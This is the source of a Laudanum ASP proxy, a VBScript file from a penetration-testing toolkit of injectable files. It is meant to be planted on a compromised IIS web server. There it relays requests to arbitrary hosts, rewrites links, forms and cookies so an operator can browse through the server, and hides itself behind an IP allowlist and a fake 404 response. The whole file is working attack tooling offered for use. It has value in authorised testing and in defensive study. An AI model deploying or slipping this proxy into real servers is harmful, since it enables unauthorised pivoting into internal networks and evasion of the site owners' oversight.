<%@Language="VBScript"%>
<%Option Explicit%>
<%Response.Buffer = True%>  
<%
' *******************************************************************************
' ***
' *** Laudanum Project
' *** A Collection of Injectable Files used during a Penetration Test
' ***
' *** More information is available at:
' ***  http://laudanum.secureideas.net
' ***  laudanum@secureideas.net
' ***
' ***  Project Leads:
' ***         Kevin Johnson <kjohnson@secureideas.net
' ***         Tim Medin <tim@securitywhole.com>
' ***
' *** Copyright 2012 by Kevin Johnson and the Laudanum Team
' ***
' ********************************************************************************
' ***
' *** This file provides access as a proxy.
' *** Written by Tim Medin <timmedin@gmail.com>
' ***
' ********************************************************************************
' *** This program is free software; you can redistribute it and/or
' *** modify it under the terms of the GNU General Public License
' *** as published by the Free Software Foundation; either version 2
' *** of the License, or (at your option) any later version.
' ***
' *** This program is distributed in the hope that it will be useful,
' *** but WITHOUT ANY WARRANTY; without even the implied warranty of
' *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' *** GNU General Public License for more details.
' ***
' *** You can get a copy of the GNU General Public License from this
' *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
' *** You can also write to the Free Software Foundation, Inc., Temple
' *** Place - Suite  Boston, MA   USA.
' ***
' ***************************************************************************** */
 
' ***************** Config entries below ***********************

' Define variables
Dim allowedIPs 
Dim allowed
Dim i
Dim s 'generic string, yeah, I know bad, but at this point I just want it to work
Dim urltemp 
Dim urlscheme
Dim urlhost
Dim urlport
Dim urlpath
Dim urlfile
Dim urlquery
Dim http 
Dim method
Dim contenttype
Dim stream
Dim regex
Dim body
Dim params

function err_handler()
	%>
<html>
<head>
  <title>Laudanum ASP Proxy</title>
</head>
<body>
  <h1>Fatal Error!</h1>
  <%=Err.Number%><br/>
  <%=Err.Message%><br/>
  <hr/>
  <address>
  Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>
</body>
</html><%
end function

function CleanQueryString
' removes laudurl from the querystring
Dim i
Dim j
Dim s
Dim key
Dim q


	if len(request.querystring) = 0 then
		CleanQueryString = ""
		exit function
	end if

	' build the request parameters
	for i = 1 to request.querystring.count
		key = request.querystring.key(i)
		'response.write "<br/>key:" & key
		if key = "laudurl" then
			' if the key is laudurl, we need check if there is a ? in the string since 
			' it may have its own query string that doesn't get parsed properly.
			s = split(request.querystring("laudurl"), "?")
			if ubound(s) > lbound(s) then
				' laudurl contains a ?, it must be manually parsed
				key = left(s(1), instr(s(1), "=") - 1)
				q = q & "&" & key & "=" & mid(s(1), len(key) + 2)
			end if
		else
			for j = 1 to request.querystring(key).count
                               	'response.write "<br/>  -value:" & request.querystring(key)(j)
				q = q & "&" & key & "=" & request.querystring(key)(j)
			next
		end if
	next

	if len(q) > 0 then
		CleanQueryString = "?" & mid(q, 2)
	else
		CleanQueryString = ""
	end if
end function
 
function CleanFormValues()
Dim r
	Set r = New RegExp
	r.IgnoreCase = true
	r.Global = true

	' remove the laudurl paramater 
	r.Pattern = "laudurl=[^&]+($|&)"
	CleanFormValues = r.Replace(request.form, "") 
	Set r = nothing
end function

sub ParseUrl()
' parses the url into the global variables
Dim urltemp
Dim url

	'get the url, it may be in the querystring for a get or from a form in a post
	url = Request.QueryString("laudurl")
	if url = "" then
		url = Request.Form("laudurl")
	end if

	if url = "" then
		urlscheme = ""
		urlhost = ""
		urlport = ""
		urlpath = ""
		urlfile = ""
		urlquery = ""
		exit sub
	end if	

	' Parse the url and break it into its components
	' this is done so it can be used to rewrite the page

	' ensure the url has a scheme, if it doesn't then assume http
	if instr(url,"://") = 0 then url = "http://" + url

	' Get the scheme
	urlscheme = split(url, "://")(0) & "://"

	' urltemp is used to hold the remainder of the url as each portion is parsed
	urltemp = mid(url, len(urlscheme) + 1)
	'get the host
	if instr(urltemp, "/") = 0 then
		' there is no path so all that is left is the host
		urlhost = urltemp
		urlport = ""
		urlpath = "/"
		urlfile = ""
		urlport = ""
	else
		' there is more that just the hostname remaining
		urlhost = left(urltemp, instr(urltemp, "/") - 1)
		urltemp = mid(urltemp, len(urlhost) + 1)

		' is there a port
		if instr(urlhost, ":") = 0 then
			' no port
			urlport = ""
		else
			' there is a port
			arr = split(urlhost, ":")
			urlhost = arr(0)
			urlport = ":" & arr(1)
		end if

		' all that is left is the path and the query
		' is there a query?
		if instr(urltemp, "?") = 0 then
			' no query
			urlpath = urltemp
			'urlquery = ""
		else
			'Response.Write "<br><br>" & urltemp & "<br><br>"
			urlpath = left(urltemp, instr(urltemp, "?") - 1)
			'urlquery = mid(urltemp, instr(urltemp, "?") + 1)
		end if
		
		if right(urlpath, 1) = "/" then
			urlfile = ""
		else
			' we need to get the path and the file
			urltemp = split(urlpath, "/")
			urlfile = urltemp(ubound(urltemp))
			urlpath = left(urlpath, len(urlpath) - len(urlfile))
		end if
	end if 

	urlquery = CleanQueryString

	'response.write "<br>scheme: " & urlscheme
	'response.write "<br>host: " & urlhost
	'response.write "<br>port: " & urlport
	'response.write "<br>path: " & urlpath
	'response.write "<br>file: " & urlfile
	'response.write "<br>query: " & urlquery 
	'response.write "<br>full: " & FullUrl()
	'response.end
end sub

function FullUrl()
	FullUrl = urlscheme & urlhost & urlport & urlpath & urlfile & urlquery
end function

sub RewriteHeaders()
Dim i
Dim header
Dim headervalue
Dim regexdomain
Dim regexpath

	' setup a regular expression to clean the cookie's domain and path
	Set regexdomain = New RegExp
	regexdomain.IgnoreCase = true
	regexdomain.Global = true
	' rewrite images and links - absolute reference
	regexdomain.Pattern = "domain=[\S]+"

	Set regexpath = New RegExp
	regexpath.IgnoreCase = true
	regexpath.Global = true
	' rewrite images and links - absolute reference
	regexpath.Pattern = "path=[\S]+"

	' go through each header
	for each i in Split(http.getAllResponseHeaders, vbLf)
		' Break on the \x0a and remove the \x0d if it exists
		i = Replace(i, vbCr, "")
		' make sure it is a header and value
		if instr(i, ":") > 0 then
			' break the response headers into header and value 
			header = trim(Left(i, instr(i, ":") - 1))
			header = replace(header, "_", "-")
			headervalue = trim(Right(i, len(i) - instr(i, ":")))

			' don't add these two header types since they are handled automatically
			if lcase(header) <> "content-type" and lcase(header) <> "content-length" and lcase(header) <> "transfer-encoding" then
				if lcase(header) = "set-cookie" then
					' strip the domain from the cookie
					headervalue = regexdomain.replace(headervalue, "")
					' strip the path from the cookie
					headervalue = regexpath.replace(headervalue, "")
					headervalue = trim(headervalue)
				end if
				response.AddHeader header, headervalue
			end if
		end if
	next
	
	Set regexdomain = nothing
	Set regexpath = nothing
end sub

' TODO: Add authentication support so it will work behind a proxy
' IPs are enterable as individual addresses TODO: add CIDR support
allowedIPs = "192.168.0.1,127.0.0.1,::1"
' Just in cace you added a space in the line above
allowedIPs = replace(allowedIPS," ","")
'turn it into an array
allowedIPs = split(allowedIPS,",") '
' make sure the ip is allowed
' TODO: change this to 0 for production, it is 1 for testing
allowed = 0 
for i = lbound(allowedIPs) to ubound(allowedIPs)
        if allowedIPS(i) = Request.ServerVariables("REMOTE_ADDR") then
                allowed = 1
                exit for
        end if
next
' send a 404 if the IP Address is not allowed
if allowed = 0 then
        Response.Status = "404 File Not Found"
        Response.Write(Response.Status & Request.ServerVariables("REMOTE_ADDR"))
        Response.End
end if


'initialize variables
Set http = nothing
Set regex = nothing
Set stream = nothing

' Define Constants
const useMSXML2 = 0
const chunkSize = 1048576 ' 1MB

' parse the url into its parts
ParseUrl()

' check if there is a valid url
if len(FullUrl) = 0 then
	' no url to proxy, give `em the boring default page
	
	' Default layout of the page
	' First thing you get when you hit the page without giving it a URL
	%>
	<html>
	<head>
		<title>Laudanum ASP Proxy</title>
		<script type="text/javascript">
			function init() {
				document.proxy.url.focus();
			}
		</script>
	</head>
	<body onload="init()">
 
	<h1>Laudanum ASP Proxy</h1>
 
	<form method="GET" name="proxy" action="<%=Request.ServerVariables("URL")%>">
		<input type="text" name="laudurl" size="70">
		<input type="submit" value="Submit">
	</form>
	<hr/>
	<address>
		Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
		Written by Tim Medin.<br/>
		Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
	</address>
	</body>
	</html>	<%

	Response.End()
end if

' Let's get our Proxy on!!!
' define the request type
if useMSXML2 = 1 then
	Set http = Server.CreateObject("MSXML2.XMLHTTP")
else
	Set http = Server.CreateObject("Microsoft.XMLHTTP")
end if

' get the request type
method = Request.ServerVariables("REQUEST_METHOD")

' setup the request, false means don't send it yet
http.Open method, FullUrl, False

' send the request
if method = "POST" then
	params = CleanFormValues
	http.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
	http.setRequestHeader "Content-length", len(params)
	http.setRequestHeader "Connection", "close"
	http.Send(params)
else
	http.Send
end if

' Replace the normal headers with the ones from the response
Response.Clear
contenttype = http.getResponseHeader("Content-Type")
Response.ContentType = contenttype

' rewrite the headers. Takes headers and passes them to new request
RewriteHeaders()

' how to respond? is it text or is it something else?
if lcase(left(contenttype, 4)) = "text" then
	' response is text, so we need to rewrite it, but that's later
	

	' do the rewriting
	body = http.responseText

	Set regex = New RegExp
	regex.IgnoreCase = true
	regex.Global = true

	' rewrite images and links - absolute reference
	s = urlscheme & urlhost & urlport
	regex.Pattern = "((src|href).?=.?['""])(\/[^'""]+['""])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "?laudurl=" & s & "$3") 

	' rewrite images and links - full reference
	regex.Pattern = "((src|href).?=.?['""])(http[^'""]+['""])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "?laudurl=$3") 

	' rewrite images and links - absolute reference
	s = urlscheme & urlhost & urlport & urlpath
	regex.Pattern = "((src|href).?=.?['""])([^\/][^'""]+['""])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "?laudurl=" & s & "$3") 


	' rewrite forms - absolute reference
	s = urlscheme & urlhost & urlport
	regex.Pattern = "(\<form[^\>]+action.?=.?['""])(\/[^'""]+)(['""][^\>]*[\>])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "$3<input type=""hidden"" name=""laudurl"" value=""" & s & "$2"">") 

	' rewrite forms - full reference
	regex.Pattern = "(\<form[^\>]+action.?=.?['""])(http[^'""]+)(['""][^\>]*[\>])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "$3<input type=""hidden"" name=""laudurl"" value=""$2"">") 

	' rewrite forms - absolute reference
	s = urlscheme & urlhost & urlport & urlpath
	regex.Pattern = "(\<form[^\>]+action.?=.?['""])([^\/][^'""]+)(['""][^\>]*[\>])"
	body = regex.Replace(body, "$1" & Request.ServerVariables("SCRIPT_NAME") & "$3<input type=""hidden"" name=""laudurl"" value=""" & s & "$2"">") 

	Response.Write(body)
	
	Set regex = nothing
else
	' some sort of binary response, so stream it
	Set stream = nothing
	Set stream = Server.CreateObject("ADODB.Stream")
	stream.Type = 1 'Binary
	stream.Open
	stream.Write http.responseBody
	stream.Position = 0

	For i = 0 to stream.Size \ chunkSize
		Response.BinaryWrite(stream.Read(chunkSize))
	next
	Set stream = nothing
end if

Set http = nothing

Response.End

:HandleError
err_handler

%>

